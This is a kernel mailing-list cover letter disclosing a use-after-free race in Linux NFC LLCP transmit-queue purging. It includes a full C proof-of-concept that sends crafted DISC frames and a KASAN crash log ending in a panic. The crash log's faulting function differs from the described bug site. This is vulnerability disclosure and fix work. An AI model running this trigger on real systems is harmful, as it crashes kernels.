Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.214.172
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1792999470;
	b=pO1gPA329m+84gwMRtiLnCi/uFJLWn3h3/PQS5m7sZMy768Bb4fZ8Kdb0Vezc0pkgKP9
	 JUN2I+TFivPFjZzaztB42X5QX6ycFNyRuMS/IqWjdLatZ0z5CQu1pnfD8VkER3QWK5LIQ
	 +w0Z7JsE//e53+b8D3+9tEm8y9gIMm5dyg4t2Fs+6h0UAFz4OKi4VRMOGoDmdqWErdvun
	 RxQwV6ErmALldx6qYFRwggIykmIpmPZXKl5b0jZ4Ftvr6QEQwJ2lhWYTYjaPh8qMIsISK
	 65aewegErQHYGuNB9++TLBe2sSHdeqzD6Mrf6yiXHNh6fHS5HbPhK5/BHvXJfbh+wMA==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1792999470;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
	 From:To:Cc:Subject:Date:Message-ID:MIME-Version:Content-Type:
	 Content-Transfer-Encoding:X-Mailer;
	bh=/FL79Acv6m1rS6yeqOXXPaeFHoXOZe3d6iQCaRUj8e4=;
	b=eFKjf6s66Wqy4U+R9GKBBgPY4+GwMxAH6tTpCYRg6PDAI+bBzAPqvy+4/L8UAY+M8qrW
	 c7sLRziILOeeijpNuoxHdaZMBmeDuxVIfF3thTuyV0s++0m5PpphhEXuabiwAjwiQrUrE
	 74JK/UXQgoda2A+WHuvncXVtkAg1T+UrqsP3jGLfXgOdMlJcYkQGoIfrcy4en/QGbAE+Z
	 k8HhwncYWMhLTnalkx4AsVZBz4PobS8A36TlQOIMlPSMzXZyp2MLmDLA8uK9C8gAuSL47
	 cT5R5h4sv5GGxmrth5GpBLhoDGK9nN2KQfKob/8DzgkGUGHoc2UAjxnfNDD53EgYlsA==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=gmail.com;
	spf=pass smtp.mailfrom=gmail.com;
	dkim=pass header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20251104 header.b="n/ZiDsFK";
	arc=none smtp.remote-ip=209.85.214.172
Received: from mail-pl1-f172.google.com (mail-pl1-f172.google.com [209.85.214.172])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 1056F606A31B
	for <stable@vger.kernel.org>; Mon, 26 Oct 2026 07:24:29 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 1056F606A31B
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20251104 header.b=n/ZiDsFK
Received: by mail-pl1-f172.google.com with SMTP id d9443c01a7336-2e9995ce866so24369935ad.0
        for <stable@vger.kernel.org>; Mon, 26 Oct 2026 00:24:29 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1792999469; x=1793604269; darn=vger.kernel.org;
        h=content-transfer-encoding:content-type:mime-version:message-id:date
         :subject:cc:to:from:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=/FL79Acv6m1rS6yeqOXXPaeFHoXOZe3d6iQCaRUj8e4=;
        b=n/ZiDsFKxki0ma+UZzC5+zgstg6L1JdPy9dNPfYppZK8NBxYvbeBCzcFDq+rBlxtgm
         RNfEPYwUEkUVbvjXAh/bJr7sBdmiuVaaENlvOehSbVfCIK5Q8BLQPtztqPWj1+8S7KME
         D0YpHkoETKZ0zYl1vpVn3U18xQh+VnGDg8J5d2UL0I6mUbGSpEDMd2+MTzEiuWojFuGJ
         3L1NAvV4yvsGPb4IoGXibrPIEQ6afBN9t6SndPZUM86aGc8Fhn0QKr1YcO+HFkI3wY4D
         5dh7SqmHcH3SDEb6zcPnTgcPBXDdKEq2Pm5Gfoumt8R5Hi6lLWcNwzBAdhTusJz6BkRj
         Aj8g==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1792999469; x=1793604269;
        h=content-transfer-encoding:content-type:mime-version:message-id:date
         :subject:cc:to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject
         :date:message-id:reply-to:content-type;
        bh=/FL79Acv6m1rS6yeqOXXPaeFHoXOZe3d6iQCaRUj8e4=;
        b=vHPjhjrA8JhPHc1Mi91qMTA2CYsY8z7VoZ9RT8nMPzRRw0P1cuOep8DCxgt5xBsDCk
         Km2Qdw5HTtabTyoK9ygku5p4xaMZfGyhd+lPueY6XJyHHaIUMyvq60m3rZU6HDOK86ez
         kZlv9XgJIObz+pJg8hCVWphePUgy7nWvItqqecVFDCUBN/kc1EfplhdXx02mtDzXNVKL
         qkageugRqg1Ky0fHGDpoAx6yK/MXrD7CqLn9ftrjdLTsIhpTFGKyK+kzsnwEo0rxzL5F
         Ik3JccUPjlTXileT+voqCDlC94YOeq9hBRiYhSTpxtvEhXQhJhogHxJ/Yw6SyzzZfxLS
         ncbw==
X-Forwarded-Encrypted: i=1; AKwUvBy+EtsV6NNGMos/WhOzrxZFKqsySNC3MK9pwsRUNpEfShMAQJHvEIiXvh9onGbzIme8f+FOTqc=@vger.kernel.org
X-Gm-Message-State: AFq9FYJ+Q+wlzdmcYXlgzk9W/gLH36WwpAaOWaPt2Bke5wBhVOZ1tQDO
	Bjca0UO+Gx/qxanNqPkl6/xwKSAaXwbZnmtscB1gjdowu6/po+ogih+xdQ7oByuhhOA=
X-Gm-Gg: AYBFou2ZBU6QQ3pX1wwCQTKXPI4EDt0TSbNBLHHsjPkIuWp1wuQOPfkKZGulcT7WWCX
	InxLZ76cfOuk60Au2OqavrXv9yZkBPgfqb2g1AlamXo16kKOTIconIF/OJ3hmH3QfkHTW81f7SA
	pjc3sXTinLglomcixhAlhqgIFQAsG2f6eNQp1GPXfvPkAJHOTTFEh9jEFsc7+BEbzC8lyveWDla
	jrS3zo7Rwwm3CxDpc4AC4+El+HsG3xFZ4JtNkCVEXe8u8JtrOmvgJcPUjB93/XxrPV+LyWtfR6O
	FoIibiJWRNeNNnz+KMWNkQdkQ5IQUpXrKP8wjktEtHvQU4fH26dhgcEAsO54Wjw7F/hTqwn0ZJr
	pDu/wM1OBjuE5XyFNsDzbxLl134utmV5LBcy8egDj8XVoO62UXLBNyNTSmK11qrS7vtIGyvI5KM
	k0tfle88WvIVUn4mj7EYqiCLqfEphMlza1iI57qolWZ3XHUfW+0Z5/ai2JSc3zVAOoauoTdlwV5
	VTnhNnMJJ5tnMFcExfiKlBz5C3Yg+KaUbKEEcH42hnEiJofP2UP4L6UMbf/6RnS5WA7ag3y3SdC
	gRYL3A+DaLjF9PrzIcxQ8WeJirInKlyicwDdUbf3
X-Received: by 2002:a17:90b:1c8e:b0:3a8:9b79:e6ea with SMTP id 98e67ed59e1d1-3adeb122e89mr5299845a91.59.1792999469213;
        Mon, 26 Oct 2026 00:24:29 -0700 (PDT)
Received: from 1137-cover.eml (awork078078.netvigator.com. [203.198.250.78])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3adebadfa82sm7242797a91.8.2026.10.26.00.24.21
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 26 Oct 2026 00:24:28 -0700 (PDT)
From: Yuqi Xu <xuyuqiabc@gmail.com>
To: netdev@vger.kernel.org, oe-linux-nfc@lists.linux.dev
Cc: David Heidelberg <david@ixit.cz>, "David S. Miller" <davem@davemloft.net>, Eric Dumazet <edumazet@google.com>, Jakub Kicinski <kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>, Simon Horman <horms@kernel.org>, stable@vger.kernel.org, Vega <vega@nebusec.ai>, Ren Wei <weir@nebusec.ai>, xuyq21@lenovo.com
Subject: [PATCH net 0/1] nfc: llcp: fix use-after-free when purging local
Date: Mon, 26 Oct 2026 15:24:07 +0800
Message-ID: <cover.1791171477.git.xuyuqiabc@gmail.com>
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Post: <mailto:stable@vger.kernel.org>
List-Help: <mailto:stable+help@vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
List-Owner: <mailto:stable+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Mailer: git-send-email 2.56.0

Hi Linux kernel maintainers,

We found and validated an issue in net/nfc/llcp_core.c. The bug is
reachable by root. NFC generic netlink admin commands used by the
PoC (DEV_UP, START_POLL) fail for an unprivileged user, including
inside a user namespace.

This bug is tracked at: https://bugtracker.nebusec.ai/f/1137

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

nfc_llcp_socket_purge() walks local->tx_queue with
skb_queue_walk_safe() and then unlinks skbs whose sk pointer matches
the socket being purged. The walk itself does not take
local->tx_queue.lock. nfc_llcp_tx_work() dequeues from that queue
and may put the skb back with skb_queue_head(). The LLCP send path
queues with skb_queue_tail(), and device teardown purges the same
queue. Those sites all take local->tx_queue.lock. A lockless walk
can dereference an skb another CPU has already freed, which is a
use-after-free and can corrupt the list.

The unlocked walk was introduced by commit f31652a58bee
("NFC: Purge LLCP socket Tx queues when being disconnected").

The fix holds local->tx_queue.lock across the walk, unlinks matching
skbs with __skb_unlink(), and frees them only after the lock is
dropped.

This is not the accept_queue lifecycle race already posted on the
list. That bug is a different object and a different fix.

Reproducer:

Root, in the initial namespace. The race is timing-sensitive, so
rerun the program if it does not trigger immediately. Commands from
the tracker materials:

  gcc -O2 -Wall -Wextra -o poc poc.c
  ./poc

unshare -Ur and unshare -Urn do not reach the NFC netlink commands.
The reporter ran it with CONFIG_NFC, CONFIG_NFC_NCI, CONFIG_NFC_SIM,
KASAN and panic_on_warn.

------BEGIN poc.c------

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <linux/netlink.h>
#include <linux/genetlink.h>
#include <linux/nfc.h>

#ifndef NLA_ALIGNTO
#define NLA_ALIGNTO 4
#define NLA_ALIGN(len) (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
#endif

#define MAX_MSG 4096
#define LLCP_PDU_DISC 0x5

static int nl_open(void) {
    int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
    if (fd < 0) {
        perror("socket(AF_NETLINK)");
        return -1;
    }
    struct sockaddr_nl addr = { .nl_family = AF_NETLINK };
    if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind(AF_NETLINK)");
        close(fd);
        return -1;
    }
    return fd;
}

static size_t nla_put(char *buf, size_t off, uint16_t type, const void *data, uint16_t len) {
    struct nlattr *na = (struct nlattr *)(buf + off);
    na->nla_type = type;
    na->nla_len = NLA_HDRLEN + len;
    memcpy((char *)na + NLA_HDRLEN, data, len);
    return off + NLA_ALIGN(na->nla_len);
}

static int nl_send(int fd, uint16_t type, uint16_t flags, uint8_t cmd,
                   const void *attrs, size_t attrs_len) {
    char buf[MAX_MSG];
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    struct genlmsghdr *gh = (struct genlmsghdr *)(buf + sizeof(*nlh));
    struct sockaddr_nl nladdr = { .nl_family = AF_NETLINK };

    memset(buf, 0, sizeof(buf));
    nlh->nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN) + attrs_len;
    nlh->nlmsg_type = type;
    nlh->nlmsg_flags = flags;
    nlh->nlmsg_seq = (uint32_t)getpid();
    nlh->nlmsg_pid = 0;
    gh->cmd = cmd;
    gh->version = 1;
    if (attrs_len)
        memcpy(buf + NLMSG_LENGTH(GENL_HDRLEN), attrs, attrs_len);

    ssize_t n = sendto(fd, buf, nlh->nlmsg_len, 0,
                       (struct sockaddr *)&nladdr, sizeof(nladdr));
    if (n < 0) {
        perror("sendto(netlink)");
        return -1;
    }
    return 0;
}

static int nl_recv_ack(int fd) {
    char buf[MAX_MSG];
    int n = recv(fd, buf, sizeof(buf), 0);
    if (n < 0) {
        perror("recv(netlink)");
        return -1;
    }
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    if (nlh->nlmsg_type == NLMSG_ERROR) {
        struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(nlh);
        if (e->error) {
            errno = -e->error;
            perror("netlink ack");
            return -1;
        }
    }
    return 0;
}

static int get_family_id(int fd) {
    char attrs[256];
    size_t off = 0;
    const char fam[] = NFC_GENL_NAME;

    off = nla_put(attrs, off, CTRL_ATTR_FAMILY_NAME, fam, sizeof(fam));
    if (nl_send(fd, GENL_ID_CTRL, NLM_F_REQUEST, CTRL_CMD_GETFAMILY, attrs, off) < 0)
        return -1;

    char buf[MAX_MSG];
    int n = recv(fd, buf, sizeof(buf), 0);
    if (n < 0) {
        perror("recv(getfamily)");
        return -1;
    }

    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    if (nlh->nlmsg_type == NLMSG_ERROR)
        return -1;

    struct genlmsghdr *gh = (struct genlmsghdr *)NLMSG_DATA(nlh);
    int rem = (int)nlh->nlmsg_len - (int)NLMSG_LENGTH(GENL_HDRLEN);
    struct nlattr *na = (struct nlattr *)((char *)gh + GENL_HDRLEN);

    int family_id = -1;
    while (rem >= (int)sizeof(*na) && na->nla_len >= sizeof(*na) && na->nla_len <= rem) {
        if (na->nla_type == CTRL_ATTR_FAMILY_ID)
            family_id = *(uint16_t *)((char *)na + NLA_HDRLEN);
        rem -= NLA_ALIGN(na->nla_len);
        na = (struct nlattr *)((char *)na + NLA_ALIGN(na->nla_len));
    }

    return family_id;
}

static int send_idx_cmd(int fd, int family, uint8_t cmd, uint32_t idx) {
    char attrs[64];
    size_t off = 0;

    off = nla_put(attrs, off, NFC_ATTR_DEVICE_INDEX, &idx, sizeof(idx));
    if (nl_send(fd, family, NLM_F_REQUEST | NLM_F_ACK, cmd, attrs, off) < 0)
        return -1;
    return nl_recv_ack(fd);
}

static int start_poll(int fd, int family, uint32_t idx, uint32_t im, uint32_t tm) {
    char attrs[128];
    size_t off = 0;

    off = nla_put(attrs, off, NFC_ATTR_DEVICE_INDEX, &idx, sizeof(idx));
    if (im)
        off = nla_put(attrs, off, NFC_ATTR_IM_PROTOCOLS, &im, sizeof(im));
    if (tm)
        off = nla_put(attrs, off, NFC_ATTR_TM_PROTOCOLS, &tm, sizeof(tm));

    if (nl_send(fd, family, NLM_F_REQUEST | NLM_F_ACK, NFC_CMD_START_POLL, attrs, off) < 0)
        return -1;
    return nl_recv_ack(fd);
}


static int dep_link_up_cmd(int fd, int family, uint32_t idx, uint32_t target_idx, uint8_t comm_mode) {
    char attrs[128];
    size_t off = 0;

    off = nla_put(attrs, off, NFC_ATTR_DEVICE_INDEX, &idx, sizeof(idx));
    off = nla_put(attrs, off, NFC_ATTR_TARGET_INDEX, &target_idx, sizeof(target_idx));
    off = nla_put(attrs, off, NFC_ATTR_COMM_MODE, &comm_mode, sizeof(comm_mode));

    if (nl_send(fd, family, NLM_F_REQUEST | NLM_F_ACK, NFC_CMD_DEP_LINK_UP, attrs, off) < 0)
        return -1;
    return nl_recv_ack(fd);
}

static int deactivate_target_cmd(int fd, int family, uint32_t idx, uint32_t target_idx) {
    char attrs[96];
    size_t off = 0;

    off = nla_put(attrs, off, NFC_ATTR_DEVICE_INDEX, &idx, sizeof(idx));
    off = nla_put(attrs, off, NFC_ATTR_TARGET_INDEX, &target_idx, sizeof(target_idx));

    if (nl_send(fd, family, NLM_F_REQUEST | NLM_F_ACK, NFC_CMD_DEACTIVATE_TARGET, attrs, off) < 0)
        return -1;
    return nl_recv_ack(fd);
}
static int get_target(int fd, int family, uint32_t idx) {
    char attrs[64];
    size_t off = 0;

    off = nla_put(attrs, off, NFC_ATTR_DEVICE_INDEX, &idx, sizeof(idx));
    if (nl_send(fd, family, NLM_F_REQUEST | NLM_F_DUMP, NFC_CMD_GET_TARGET, attrs, off) < 0)
        return -1;

    int target = -1;
    for (;;) {
        char buf[MAX_MSG];
        int n = recv(fd, buf, sizeof(buf), 0);
        if (n < 0) {
            perror("recv(get_target)");
            return -1;
        }

        struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
        if (nlh->nlmsg_type == NLMSG_DONE)
            break;
        if (nlh->nlmsg_type == NLMSG_ERROR) {
            struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(nlh);
            if (e->error) {
                errno = -e->error;
                perror("get_target");
                return -1;
            }
            continue;
        }

        struct genlmsghdr *gh = (struct genlmsghdr *)NLMSG_DATA(nlh);
        int rem = (int)nlh->nlmsg_len - (int)NLMSG_LENGTH(GENL_HDRLEN);
        struct nlattr *na = (struct nlattr *)((char *)gh + GENL_HDRLEN);

        while (rem >= (int)sizeof(*na) && na->nla_len >= sizeof(*na) && na->nla_len <= rem) {
            if (na->nla_type == NFC_ATTR_TARGET_INDEX)
                target = *(uint32_t *)((char *)na + NLA_HDRLEN);
            rem -= NLA_ALIGN(na->nla_len);
            na = (struct nlattr *)((char *)na + NLA_ALIGN(na->nla_len));
        }
    }

    return target;
}

static void dump_llcp_name(const char *tag, int fd, bool peer) {
    struct sockaddr_nfc_llcp a;
    socklen_t alen = sizeof(a);
    memset(&a, 0, sizeof(a));

    int rc = peer ? getpeername(fd, (struct sockaddr *)&a, &alen)
                  : getsockname(fd, (struct sockaddr *)&a, &alen);
    if (rc < 0) {
        fprintf(stderr, "%s %s failed: %s\n", tag,
                peer ? "getpeername" : "getsockname", strerror(errno));
        return;
    }

    fprintf(stderr,
            "%s %s: dev=%u target=%u proto=%u dsap=%u ssap=%u sn_len=%zu\n",
            tag, peer ? "peer" : "self", a.dev_idx, a.target_idx,
            a.nfc_protocol, a.dsap, a.ssap, a.service_name_len);
}

int main(void) {
    const uint32_t dev_initiator = 0;
    const uint32_t dev_target = 1;
    const char service_name[] = "urn:nfc:sn:exp";

    int nlfd = -1, lfd = -1, cfd = -1, afd = -1, rawfd = -1;
    int family;
    int target_idx;

    nlfd = nl_open();
    if (nlfd < 0)
        return 1;

    family = get_family_id(nlfd);
    if (family <= 0) {
        fprintf(stderr, "Failed to get NFC generic netlink family id\n");
        return 1;
    }
    fprintf(stderr, "NFC family id=%d\n", family);

    if (send_idx_cmd(nlfd, family, NFC_CMD_DEV_UP, dev_initiator) < 0)
        perror("DEV_UP initiator");
    if (send_idx_cmd(nlfd, family, NFC_CMD_DEV_UP, dev_target) < 0)
        perror("DEV_UP target");

    uint32_t dep = NFC_PROTO_NFC_DEP_MASK;
    if (start_poll(nlfd, family, dev_initiator, dep, 0) < 0) {
        fprintf(stderr, "start_poll initiator failed\n");
        return 1;
    }
    if (start_poll(nlfd, family, dev_target, 0, dep) < 0) {
        fprintf(stderr, "start_poll target failed\n");
        return 1;
    }

    usleep(400000);

    target_idx = get_target(nlfd, family, dev_initiator);
    if (target_idx < 0) {
        fprintf(stderr, "Could not obtain target index for device %u\n", dev_initiator);
        return 1;
    }
    fprintf(stderr, "Target index on initiator device=%d\n", target_idx);

    if (dep_link_up_cmd(nlfd, family, dev_initiator, (uint32_t)target_idx, NFC_COMM_ACTIVE) < 0) {
        perror("NFC_CMD_DEP_LINK_UP");
        return 1;
    }
    usleep(200000);

    lfd = socket(AF_NFC, SOCK_STREAM, NFC_SOCKPROTO_LLCP);
    if (lfd < 0) {
        perror("socket(listener)");
        return 1;
    }

    struct sockaddr_nfc_llcp laddr;
    memset(&laddr, 0, sizeof(laddr));
    laddr.sa_family = AF_NFC;
    laddr.dev_idx = dev_target;
    laddr.nfc_protocol = NFC_PROTO_NFC_DEP;
    laddr.dsap = 0;
    laddr.ssap = 0;
    memcpy(laddr.service_name, service_name, sizeof(service_name) - 1);
    laddr.service_name_len = sizeof(service_name) - 1;

    if (bind(lfd, (struct sockaddr *)&laddr, sizeof(laddr)) < 0) {
        perror("bind(listener)");
        return 1;
    }
    if (listen(lfd, 1) < 0) {
        perror("listen(listener)");
        return 1;
    }
    fprintf(stderr, "listener bound on dev=%u service=%s\n", dev_target, service_name);

    cfd = socket(AF_NFC, SOCK_STREAM, NFC_SOCKPROTO_LLCP);
    if (cfd < 0) {
        perror("socket(client)");
        return 1;
    }

    struct sockaddr_nfc_llcp caddr;
    memset(&caddr, 0, sizeof(caddr));
    caddr.sa_family = AF_NFC;
    caddr.dev_idx = dev_initiator;
    caddr.target_idx = (uint32_t)target_idx;
    caddr.nfc_protocol = NFC_PROTO_NFC_DEP;
    caddr.dsap = 0;
    memcpy(caddr.service_name, service_name, sizeof(service_name) - 1);
    caddr.service_name_len = sizeof(service_name) - 1;

    if (connect(cfd, (struct sockaddr *)&caddr, sizeof(caddr)) < 0) {
        perror("connect(client)");
        return 1;
    }

    afd = accept(lfd, NULL, NULL);
    if (afd < 0) {
        perror("accept(listener)");
        return 1;
    }

    dump_llcp_name("client", cfd, false);
    dump_llcp_name("client", cfd, true);
    dump_llcp_name("accepted", afd, false);
    dump_llcp_name("accepted", afd, true);

    struct sockaddr_nfc_llcp cself;
    socklen_t cself_len = sizeof(cself);
    memset(&cself, 0, sizeof(cself));
    if (getsockname(cfd, (struct sockaddr *)&cself, &cself_len) < 0) {
        perror("getsockname(client)");
        return 1;
    }

    uint8_t client_ssap = cself.ssap;
    uint8_t server_ssap = 0;
    struct sockaddr_nfc_llcp aself;
    socklen_t aself_len = sizeof(aself);
    memset(&aself, 0, sizeof(aself));
    if (getsockname(afd, (struct sockaddr *)&aself, &aself_len) == 0)
        server_ssap = aself.ssap;
    fprintf(stderr, "client ssap=%u server ssap=%u\n", client_ssap, server_ssap);

    if (close(cfd) < 0)
        perror("close(client)");
    cfd = -1;

    usleep(400000);

    if (deactivate_target_cmd(nlfd, family, dev_initiator, (uint32_t)target_idx) < 0) {
        perror("NFC_CMD_DEACTIVATE_TARGET");
    }

    rawfd = socket(AF_NFC, SOCK_SEQPACKET, NFC_SOCKPROTO_RAW);
    if (rawfd < 0) {
        perror("socket(raw)");
        return 1;
    }

    struct sockaddr_nfc raddr;
    memset(&raddr, 0, sizeof(raddr));
    raddr.sa_family = AF_NFC;
    raddr.dev_idx = dev_initiator;
    raddr.target_idx = (uint32_t)target_idx;
    raddr.nfc_protocol = NFC_PROTO_NFC_DEP;

    if (connect(rawfd, (struct sockaddr *)&raddr, sizeof(raddr)) < 0) {
        perror("connect(raw)");
        return 1;
    }

    uint8_t disc[2];
    disc[0] = (uint8_t)((server_ssap << 2) | (LLCP_PDU_DISC >> 2));
    disc[1] = (uint8_t)((LLCP_PDU_DISC << 6) | (client_ssap & 0x3f));

    fprintf(stderr, "sending crafted DISC frame bytes: %02x %02x\n", disc[0], disc[1]);

    for (int i = 0; i < 2000; i++) {
        ssize_t n = send(rawfd, disc, sizeof(disc), 0);
        if (n < 0) {
            fprintf(stderr, "send(raw DISC) failed at iter %d: %s\n", i, strerror(errno));
            break;
        }
        if ((i % 100) == 0)
            usleep(1000);
    }

    fprintf(stderr, "done sending crafted DISC frames\n");
    sleep(1);

    if (rawfd >= 0)
        close(rawfd);
    if (afd >= 0)
        close(afd);
    if (lfd >= 0)
        close(lfd);
    if (nlfd >= 0)
        close(nlfd);

    return 0;
}
------END poc.c--------

----BEGIN crash log----

[  155.863220][  T949] =====================================
[  155.865809][  T949] WARNING: bad unlock balance detected!
[  155.873547][  T949] kworker/1:2/949 is trying to release lock (sk_lock-AF_NFC) at:
[  155.877145][  T949] [<ffffffff8a4e5a2e>] nfc_llcp_rx_skb+0x1e2e/0x3ed0
[  155.880682][  T949] but there are no more locks to release!
[  156.042524][ T5144] ==================================================================
[  156.046320][ T5144] BUG: KASAN: slab-use-after-free in nfc_llcp_sock_get+0x233/0x260
[  156.050014][ T5144] Read of size 1 at addr ffff88802de1bd80 by task kworker/1:4/5144
[  156.066148][ T5144] Call Trace:
[  156.083921][ T5144]  nfc_llcp_sock_get+0x233/0x260
[  156.085820][ T5144]  nfc_llcp_rx_skb+0x1d53/0x3ed0
[  156.099618][ T5144]  nfc_llcp_rx_work+0xf3/0x230
[  156.101041][ T5144]  process_one_work+0x981/0x1930
[  156.106598][ T5144]  worker_thread+0x729/0x10e0
[  156.111722][ T5144]  ret_from_fork+0x4b/0x80
[  156.118725][ T5144] Allocated by task 949:
[  156.128510][ T5144]  nfc_llcp_sock_alloc+0x37/0x600
[  156.129846][ T5144]  nfc_llcp_rx_skb+0x214e/0x3ed0
[  156.137938][ T5144] Freed by task 5144:
[  156.146930][ T5144]  __sk_destruct+0x61e/0x750
[  156.151513][ T5144]  nfc_llcp_rx_skb+0x2c66/0x3ed0
[  156.260498][ T5144] ==================================================================
[  156.262693][ T5144] Kernel panic - not syncing: KASAN: panic_on_warn set ...
[  156.270979][ T5144] Call Trace:
[  156.283591][ T5144]  check_panic_on_warn+0xac/0xb0
[  156.285952][ T5144]  kasan_report+0xf2/0x110
[  156.288680][ T5144]  nfc_llcp_sock_get+0x233/0x260
[  156.290008][ T5144]  nfc_llcp_rx_skb+0x1d53/0x3ed0
[  156.302196][ T5144]  process_one_work+0x981/0x1930
[  156.313945][ T5144]  ret_from_fork+0x4b/0x80
[  156.317915][ T5144]  </TASK>
[  156.318995][ T5144] Kernel Offset: disabled
[  156.320156][ T5144] Rebooting in 86400 seconds..
-----END crash log-----

Best regards,
Yuqi Xu

-- 
2.55.0
